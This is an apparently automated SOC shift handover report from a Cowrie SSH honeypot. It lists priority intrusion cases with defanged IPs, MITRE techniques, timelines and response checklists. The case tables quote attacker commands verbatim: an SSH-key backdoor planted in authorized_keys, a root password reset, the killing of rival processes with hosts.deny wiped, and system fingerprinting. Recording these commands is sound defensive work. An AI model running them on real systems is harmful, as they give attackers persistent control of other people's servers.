# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-15 |
| **Generated At** | 2026-03-15T05:27:21Z |
| **Shift Time** | 05:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **176** |
| Confirmed Threats | **139** |
| False Positives Filtered | **37** (21.0%) |
| Unique Attacker IPs | **50** |
| Countries of Origin | **19** |
| High Severity Cases | **31** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **145** |
| Malware Samples Analyzed | **0** HIGH · **1** MED · 0 empty upload attempt(s) |

---

## 🚨 Priority Cases — Immediate Attention (26)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-858976dd2d2a

| Field | Detail |
|---|---|
| **Source IP** | `118.194.230[.]250` |
| **First Seen** | 2026-03-15 02:26 |
| **Last Seen** | 2026-03-15 02:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:26:43` | `cowrie.session.connect` |
| `2026-03-15 02:26:43` | `cowrie.client.version` |
| `2026-03-15 02:26:43` | `cowrie.client.kex` |
| `2026-03-15 02:26:43` | `cowrie.login.success` |
| `2026-03-15 02:26:44` | `cowrie.session.params` |
| `2026-03-15 02:26:44` | `cowrie.command.input` |
| `2026-03-15 02:26:44` | `cowrie.command.failed` |
| `2026-03-15 02:26:44` | `cowrie.log.closed` |
| `2026-03-15 02:26:44` | `cowrie.session.params` |
| `2026-03-15 02:26:44` | `cowrie.command.input` |
| `2026-03-15 02:26:44` | `cowrie.session.file_download` |
| `2026-03-15 02:26:44` | `cowrie.log.closed` |
| `2026-03-15 02:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.230[.]250` to AbuseIPDB if not already reported
- [ ] Block `118.194.230[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf808a5a9b23

| Field | Detail |
|---|---|
| **Source IP** | `118.194.230[.]250` |
| **First Seen** | 2026-03-15 02:26 |
| **Last Seen** | 2026-03-15 02:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:26:46` | `cowrie.session.connect` |
| `2026-03-15 02:26:46` | `cowrie.client.version` |
| `2026-03-15 02:26:46` | `cowrie.client.kex` |
| `2026-03-15 02:26:47` | `cowrie.login.success` |
| `2026-03-15 02:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.230[.]250` to AbuseIPDB if not already reported
- [ ] Block `118.194.230[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e9d04e04f0

| Field | Detail |
|---|---|
| **Source IP** | `118.194.230[.]250` |
| **First Seen** | 2026-03-15 02:28 |
| **Last Seen** | 2026-03-15 02:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:28:45` | `cowrie.session.connect` |
| `2026-03-15 02:28:45` | `cowrie.client.version` |
| `2026-03-15 02:28:45` | `cowrie.client.kex` |
| `2026-03-15 02:28:46` | `cowrie.login.success` |
| `2026-03-15 02:28:46` | `cowrie.session.params` |
| `2026-03-15 02:28:46` | `cowrie.command.input` |
| `2026-03-15 02:28:46` | `cowrie.command.failed` |
| `2026-03-15 02:28:46` | `cowrie.log.closed` |
| `2026-03-15 02:28:47` | `cowrie.session.params` |
| `2026-03-15 02:28:47` | `cowrie.command.input` |
| `2026-03-15 02:28:47` | `cowrie.session.file_download` |
| `2026-03-15 02:28:47` | `cowrie.log.closed` |
| `2026-03-15 02:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.230[.]250` to AbuseIPDB if not already reported
- [ ] Block `118.194.230[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe673381b5d0

| Field | Detail |
|---|---|
| **Source IP** | `118.194.230[.]250` |
| **First Seen** | 2026-03-15 02:28 |
| **Last Seen** | 2026-03-15 02:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:28:49` | `cowrie.session.connect` |
| `2026-03-15 02:28:49` | `cowrie.client.version` |
| `2026-03-15 02:28:49` | `cowrie.client.kex` |
| `2026-03-15 02:28:49` | `cowrie.login.success` |
| `2026-03-15 02:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.230[.]250` to AbuseIPDB if not already reported
- [ ] Block `118.194.230[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70620d6aa19e

| Field | Detail |
|---|---|
| **Source IP** | `101.52.130[.]122` |
| **First Seen** | 2026-03-15 02:40 |
| **Last Seen** | 2026-03-15 02:41 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:EaQA55UOXe9f"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:40:30` | `cowrie.session.connect` |
| `2026-03-15 02:40:30` | `cowrie.client.version` |
| `2026-03-15 02:40:31` | `cowrie.client.kex` |
| `2026-03-15 02:40:34` | `cowrie.login.success` |
| `2026-03-15 02:40:35` | `cowrie.session.params` |
| `2026-03-15 02:40:35` | `cowrie.command.input` |
| `2026-03-15 02:40:35` | `cowrie.command.failed` |
| `2026-03-15 02:40:36` | `cowrie.log.closed` |
| `2026-03-15 02:40:37` | `cowrie.session.params` |
| `2026-03-15 02:40:37` | `cowrie.command.input` |
| `2026-03-15 02:40:38` | `cowrie.session.file_download` |
| `2026-03-15 02:40:38` | `cowrie.log.closed` |
| `2026-03-15 02:40:53` | `cowrie.session.params` |
| `2026-03-15 02:40:53` | `cowrie.command.input` |
| `2026-03-15 02:40:53` | `cowrie.log.closed` |
| `2026-03-15 02:40:53` | `cowrie.session.params` |
| `2026-03-15 02:40:53` | `cowrie.command.input` |
| `2026-03-15 02:40:53` | `cowrie.log.closed` |
| `2026-03-15 02:40:54` | `cowrie.session.params` |
| `2026-03-15 02:40:54` | `cowrie.command.input` |
| `2026-03-15 02:40:54` | `cowrie.session.file_download` |
| `2026-03-15 02:40:54` | `cowrie.log.closed` |
| `2026-03-15 02:40:54` | `cowrie.session.params` |
| `2026-03-15 02:40:54` | `cowrie.command.input` |
| `2026-03-15 02:40:54` | `cowrie.log.closed` |
| `2026-03-15 02:40:55` | `cowrie.session.params` |
| `2026-03-15 02:40:55` | `cowrie.command.input` |
| `2026-03-15 02:40:55` | `cowrie.log.closed` |
| `2026-03-15 02:40:55` | `cowrie.session.params` |
| `2026-03-15 02:40:55` | `cowrie.command.input` |
| `2026-03-15 02:40:55` | `cowrie.command.input` |
| `2026-03-15 02:40:55` | `cowrie.log.closed` |
| `2026-03-15 02:40:56` | `cowrie.session.params` |
| `2026-03-15 02:40:56` | `cowrie.command.input` |
| `2026-03-15 02:40:56` | `cowrie.log.closed` |
| `2026-03-15 02:40:56` | `cowrie.session.params` |
| `2026-03-15 02:40:56` | `cowrie.command.input` |
| `2026-03-15 02:40:56` | `cowrie.log.closed` |
| `2026-03-15 02:40:56` | `cowrie.session.params` |
| `2026-03-15 02:40:56` | `cowrie.command.input` |
| `2026-03-15 02:40:57` | `cowrie.log.closed` |
| `2026-03-15 02:40:57` | `cowrie.session.params` |
| `2026-03-15 02:40:57` | `cowrie.command.input` |
| `2026-03-15 02:40:57` | `cowrie.log.closed` |
| `2026-03-15 02:40:57` | `cowrie.session.params` |
| `2026-03-15 02:40:57` | `cowrie.command.input` |
| `2026-03-15 02:40:57` | `cowrie.log.closed` |
| `2026-03-15 02:40:58` | `cowrie.session.params` |
| `2026-03-15 02:40:58` | `cowrie.command.input` |
| `2026-03-15 02:40:58` | `cowrie.log.closed` |
| `2026-03-15 02:40:58` | `cowrie.session.params` |
| `2026-03-15 02:40:58` | `cowrie.command.input` |
| `2026-03-15 02:40:58` | `cowrie.log.closed` |
| `2026-03-15 02:40:59` | `cowrie.session.params` |
| `2026-03-15 02:40:59` | `cowrie.command.input` |
| `2026-03-15 02:40:59` | `cowrie.log.closed` |
| `2026-03-15 02:40:59` | `cowrie.session.params` |
| `2026-03-15 02:40:59` | `cowrie.command.input` |
| `2026-03-15 02:40:59` | `cowrie.log.closed` |
| `2026-03-15 02:41:00` | `cowrie.session.params` |
| `2026-03-15 02:41:00` | `cowrie.command.input` |
| `2026-03-15 02:41:00` | `cowrie.log.closed` |
| `2026-03-15 02:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.52.130[.]122` to AbuseIPDB if not already reported
- [ ] Block `101.52.130[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feac3c4d6c28

| Field | Detail |
|---|---|
| **Source IP** | `105.27.148[.]94` |
| **First Seen** | 2026-03-15 02:45 |
| **Last Seen** | 2026-03-15 02:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:45:01` | `cowrie.session.connect` |
| `2026-03-15 02:45:01` | `cowrie.client.version` |
| `2026-03-15 02:45:01` | `cowrie.client.kex` |
| `2026-03-15 02:45:02` | `cowrie.login.success` |
| `2026-03-15 02:45:02` | `cowrie.session.params` |
| `2026-03-15 02:45:02` | `cowrie.command.input` |
| `2026-03-15 02:45:02` | `cowrie.command.failed` |
| `2026-03-15 02:45:03` | `cowrie.log.closed` |
| `2026-03-15 02:45:03` | `cowrie.session.params` |
| `2026-03-15 02:45:03` | `cowrie.command.input` |
| `2026-03-15 02:45:03` | `cowrie.session.file_download` |
| `2026-03-15 02:45:03` | `cowrie.log.closed` |
| `2026-03-15 02:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `105.27.148[.]94` to AbuseIPDB if not already reported
- [ ] Block `105.27.148[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccd389769a8f

| Field | Detail |
|---|---|
| **Source IP** | `189.152.42[.]213` |
| **First Seen** | 2026-03-15 02:45 |
| **Last Seen** | 2026-03-15 02:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:45:06` | `cowrie.session.connect` |
| `2026-03-15 02:45:06` | `cowrie.client.version` |
| `2026-03-15 02:45:06` | `cowrie.client.kex` |
| `2026-03-15 02:45:07` | `cowrie.login.success` |
| `2026-03-15 02:45:08` | `cowrie.session.params` |
| `2026-03-15 02:45:08` | `cowrie.command.input` |
| `2026-03-15 02:45:08` | `cowrie.command.failed` |
| `2026-03-15 02:45:08` | `cowrie.log.closed` |
| `2026-03-15 02:45:09` | `cowrie.session.params` |
| `2026-03-15 02:45:09` | `cowrie.command.input` |
| `2026-03-15 02:45:09` | `cowrie.session.file_download` |
| `2026-03-15 02:45:09` | `cowrie.log.closed` |
| `2026-03-15 02:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.152.42[.]213` to AbuseIPDB if not already reported
- [ ] Block `189.152.42[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3292e382368a

| Field | Detail |
|---|---|
| **Source IP** | `105.27.148[.]94` |
| **First Seen** | 2026-03-15 02:45 |
| **Last Seen** | 2026-03-15 02:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:45:06` | `cowrie.session.connect` |
| `2026-03-15 02:45:06` | `cowrie.client.version` |
| `2026-03-15 02:45:07` | `cowrie.client.kex` |
| `2026-03-15 02:45:08` | `cowrie.login.success` |
| `2026-03-15 02:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `105.27.148[.]94` to AbuseIPDB if not already reported
- [ ] Block `105.27.148[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-684f13727ed9

| Field | Detail |
|---|---|
| **Source IP** | `189.152.42[.]213` |
| **First Seen** | 2026-03-15 02:45 |
| **Last Seen** | 2026-03-15 02:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:45:12` | `cowrie.session.connect` |
| `2026-03-15 02:45:12` | `cowrie.client.version` |
| `2026-03-15 02:45:12` | `cowrie.client.kex` |
| `2026-03-15 02:45:13` | `cowrie.login.success` |
| `2026-03-15 02:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.152.42[.]213` to AbuseIPDB if not already reported
- [ ] Block `189.152.42[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c29d4d2b7e7

| Field | Detail |
|---|---|
| **Source IP** | `179.183.192[.]58` |
| **First Seen** | 2026-03-15 02:56 |
| **Last Seen** | 2026-03-15 02:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:56:51` | `cowrie.session.connect` |
| `2026-03-15 02:56:51` | `cowrie.client.version` |
| `2026-03-15 02:56:51` | `cowrie.client.kex` |
| `2026-03-15 02:56:53` | `cowrie.login.success` |
| `2026-03-15 02:56:54` | `cowrie.session.params` |
| `2026-03-15 02:56:54` | `cowrie.command.input` |
| `2026-03-15 02:56:54` | `cowrie.command.failed` |
| `2026-03-15 02:56:54` | `cowrie.log.closed` |
| `2026-03-15 02:56:55` | `cowrie.session.params` |
| `2026-03-15 02:56:55` | `cowrie.command.input` |
| `2026-03-15 02:56:55` | `cowrie.session.file_download` |
| `2026-03-15 02:56:55` | `cowrie.log.closed` |
| `2026-03-15 02:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.183.192[.]58` to AbuseIPDB if not already reported
- [ ] Block `179.183.192[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68646fc61925

| Field | Detail |
|---|---|
| **Source IP** | `179.183.192[.]58` |
| **First Seen** | 2026-03-15 02:56 |
| **Last Seen** | 2026-03-15 02:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 02:56:59` | `cowrie.session.connect` |
| `2026-03-15 02:56:59` | `cowrie.client.version` |
| `2026-03-15 02:56:59` | `cowrie.client.kex` |
| `2026-03-15 02:57:00` | `cowrie.login.success` |
| `2026-03-15 02:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.183.192[.]58` to AbuseIPDB if not already reported
- [ ] Block `179.183.192[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e4fcefc4fa

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 04:49 |
| **Last Seen** | 2026-03-15 04:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 04:49:21` | `cowrie.session.connect` |
| `2026-03-15 04:49:21` | `cowrie.client.version` |
| `2026-03-15 04:49:21` | `cowrie.client.kex` |
| `2026-03-15 04:49:22` | `cowrie.login.success` |
| `2026-03-15 04:49:22` | `cowrie.session.params` |
| `2026-03-15 04:49:22` | `cowrie.command.input` |
| `2026-03-15 04:49:22` | `cowrie.command.failed` |
| `2026-03-15 04:49:22` | `cowrie.log.closed` |
| `2026-03-15 04:49:23` | `cowrie.session.params` |
| `2026-03-15 04:49:23` | `cowrie.command.input` |
| `2026-03-15 04:49:23` | `cowrie.session.file_download` |
| `2026-03-15 04:49:23` | `cowrie.log.closed` |
| `2026-03-15 04:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3210f4733164

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]245` |
| **First Seen** | 2026-03-15 04:49 |
| **Last Seen** | 2026-03-15 04:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 04:49:25` | `cowrie.session.connect` |
| `2026-03-15 04:49:25` | `cowrie.client.version` |
| `2026-03-15 04:49:25` | `cowrie.client.kex` |
| `2026-03-15 04:49:25` | `cowrie.login.success` |
| `2026-03-15 04:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]245` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71efbd87a697

| Field | Detail |
|---|---|
| **Source IP** | `206.189.138[.]45` |
| **First Seen** | 2026-03-15 05:00 |
| **Last Seen** | 2026-03-15 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:00:27` | `cowrie.session.connect` |
| `2026-03-15 05:00:27` | `cowrie.client.version` |
| `2026-03-15 05:00:27` | `cowrie.client.kex` |
| `2026-03-15 05:00:28` | `cowrie.login.success` |
| `2026-03-15 05:00:28` | `cowrie.session.params` |
| `2026-03-15 05:00:28` | `cowrie.command.input` |
| `2026-03-15 05:00:28` | `cowrie.command.input` |
| `2026-03-15 05:00:28` | `cowrie.command.input` |
| `2026-03-15 05:00:28` | `cowrie.command.input` |
| `2026-03-15 05:00:29` | `cowrie.log.closed` |
| `2026-03-15 05:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.138[.]45` to AbuseIPDB if not already reported
